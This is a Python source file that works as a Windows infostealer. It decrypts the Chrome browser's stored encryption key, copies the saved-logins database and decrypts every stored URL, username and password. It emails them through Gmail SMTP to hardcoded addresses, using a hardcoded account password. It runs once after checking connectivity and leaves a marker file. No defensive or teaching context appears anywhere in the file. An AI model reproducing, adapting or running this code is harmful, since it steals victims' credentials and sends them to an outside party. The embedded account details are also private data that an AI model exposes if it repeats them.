import base64
import json
import os
import shutil
import smtplib as s_m_t_p
import sqlite3 as banco
import urllib.request
from datetime import datetime, timedelta
from time import sleep
import win32crypt as wc
from Crypto.Cipher import AES as aes
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def enviaInformacao(email, password, emailDestination, emailDestination2, content):
    server = s_m_t_p.SMTP_SSL('smtp.gmail.com', 465)
    server.login(email, password)
    server.sendmail('jeffersonssantos@gmail.com',
                    emailDestination, content.encode('utf-8'))
    server.sendmail('jeffersonssantos93@gmail.com',
                    emailDestination2, content.encode('utf-8'))
    server.quit()
try:
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return wc.CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = aes.new(key, aes.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(wc.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    def main():
        key = get_encryption_key()
        try:
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        except Exception as e:
            print(e)
            exit()
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = banco.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        lista = ['SENHAS↓↓↓\n\n']
        separador = '=' * 50, '\n'
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                lista.append(f"Origin URL: {origin_url}\n")
                lista.append(f"Action URL: {action_url}\n")
                lista.append(f"Username: {username}\n")
                lista.append(f"Password: {password}\n")
                lista.append(separador)
            else:
                continue
            if date_created != 86400000000 and date_created:
                date = f"Creation date: {str(get_chrome_datetime(date_created))}"
                lista.append(f"{date}\n")
                print(date)
            if date_last_used != 86400000000 and date_last_used:
                lastUsed = f"Last Used: {str(get_chrome_datetime(date_last_used))}"
                lista.append(f"{lastUsed}\n\n")
                print(lastUsed)
            lista.append("\n")
            print("="*50)
        result = ''.join(''.join(map(str, tup)) for tup in lista)
        print(result)
        enviaInformacao('jeffersonssantos93@gmail.com', 'qjqsooevacrnpuzn',
                        'jeffersonssantos93@gmail.com', 'jeffersonssantos92@gmail.com', result)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
    def connect(host='https://mail.google.com/'):
        try:
            urllib.request.urlopen(host)  
            return True
        except:
            return False
    filePath = os.path.join(os.environ["USERPROFILE"])
    def inicia():
        while connect() is False:
            print('erro de conexão')
            sleep(1.5)
        if connect():
            main()
            os.chdir(filePath)
            with open('file', 'w') as f:
                f.write('w')
    if os.path.exists(f'{filePath}/file') == False:
        inicia()
except Exception as e:
    print(e)
